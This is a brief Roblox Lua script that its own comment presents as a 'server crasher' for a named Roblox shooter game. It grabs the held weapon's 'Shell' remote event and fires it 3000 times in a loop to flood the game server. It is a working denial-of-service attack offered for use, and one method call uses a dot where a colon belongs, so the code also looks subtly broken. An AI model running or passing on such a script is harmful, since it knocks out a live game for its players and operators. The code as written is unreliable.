--[[server crasher for this shit game.
Hold an AR out then execute kthx mwa
https://www.roblox.com/games/8199791819/Block-ShootOut-20K-UPDATED]]--

local LP = game:GetService'Players'.LocalPlayer
local Tool = LP.Character.FindFirstChildOfClass'Tool'
local Shell = Tool.Shell

for _ = 1,3000 do
  Shell:FireServer(LP)
end
